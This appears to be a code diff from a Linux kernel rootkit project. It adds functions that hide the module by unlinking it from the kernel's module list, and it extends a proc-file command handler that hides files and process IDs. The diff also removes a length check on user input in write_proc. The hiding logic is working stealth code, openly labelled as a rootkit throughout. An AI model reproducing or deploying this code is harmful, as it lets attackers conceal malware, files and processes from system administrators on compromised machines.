@@ -11,13 +11,32 @@
 #include <linux/list.h>
 #include <asm/paravirt.h> // write_cr0
 
+#include "config.h"
 #include "proc.h"
 #include "hooks.h"
 
-#define PROC_FILENAME "rootkit_proc"
-#define LONG_ORDEN 256
+int hidden = HIDE_MODULE;
+static struct list_head* prev;
 
-char orden[LONG_ORDEN];
+int hide_module(void){
+	if (hidden)
+		return -1;
+	prev = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+	hidden = 1;
+	return 0;
+	// rb stuff ??
+	// kobject stuff for sys ??
+}
+
+int unhide_module(void){
+	if (!hidden)
+		return -1;
+	list_add(&THIS_MODULE->list, prev); //adds the module after the module which was prev to it
+	//maybe we all die if this prev is not in the list anymore
+	hidden = 0;
+	return 0;
+}
 
 void handle_request(const char __user* buff, size_t len){
 	int id, pid;
@@ -28,25 +47,21 @@ void handle_request(const char __user* buff, size_t len){
 			copy_from_user(filename, buff + sizeof(int), sizeof(filename));
 			if (hide_file(filename) == -1)
 				printk(KERN_INFO "ROOTKIT: ERROR hiding file %s in proc\n", filename);
-			printk(KERN_INFO "ROOTKIT: petición esconder file %s terminada\n", filename);
 			break;
-		case 2:
+		case 2:// UNHIDE FILE
 			copy_from_user(filename, buff + sizeof(int), sizeof(filename));
 			if (unhide_file(filename) == -1)
 				printk(KERN_INFO "ROOTKIT: ERROR unhiding file %s in proc\n", filename);
-			printk(KERN_INFO "ROOTKIT: petición desesconder file %s terminada\n", filename);
 			break;
 		case 3: // HIDE PID
 			copy_from_user(&pid, buff + sizeof(int), sizeof(pid));
 			if (hide_pid(pid) == -1)
 				printk(KERN_INFO "ROOTKIT: ERROR hiding pid %d in proc\n", pid);
-			printk(KERN_INFO "ROOTKIT: petición esconder pid %d terminada\n", pid);
 			break;
 		case 4: // HIDE PID
 			copy_from_user(&pid, buff + sizeof(int), sizeof(pid));
 			if (unhide_pid(pid) == -1)
 				printk(KERN_INFO "ROOTKIT: ERROR unhiding pid %d in proc\n", pid);
-			printk(KERN_INFO "ROOTKIT: petición desesconder pid %d terminada\n", pid);
 			break;
 		case 5: // PRINT HIDDEN
 			printk(KERN_INFO "ROOTKIT: Hidden files: ");
@@ -56,16 +71,23 @@ void handle_request(const char __user* buff, size_t len){
 			}
 			printk(KERN_CONT "\n");
 			break;
+		case 6: // HIDE MODULE
+			//if (delete_module("rootkit", O_NONBLOCK) == -1)
+			//	printk(KERN_INFO "ROOTKIT: ERROR trying to delete module\n");
+			if (hide_module() == -1)
+				printk(KERN_INFO "ROOTKIT: ERROR hiding module\n");
+			break;
+		case 7: // UNHIDE MODULE
+			if (unhide_module() == -1)
+				printk(KERN_INFO "ROOTKIT: ERROR unhiding module\n");
+			break;
 		default:
-			printk(KERN_INFO "ROOTKIT: ERROR Unknown peticion a proc\n");
+			printk(KERN_INFO "ROOTKIT: ERROR Unknown request in proc file\n");
 	}
 }
 
 static ssize_t write_proc(struct file* f, const char __user* buff, size_t len, loff_t* off){
     printk(KERN_INFO "ROOTKIT: Hi from write_proc\n");
-    if (len > LONG_ORDEN){
-        return -1;
-    }
 
 	// I don't know if this should be handled here
 	handle_request(buff, len);
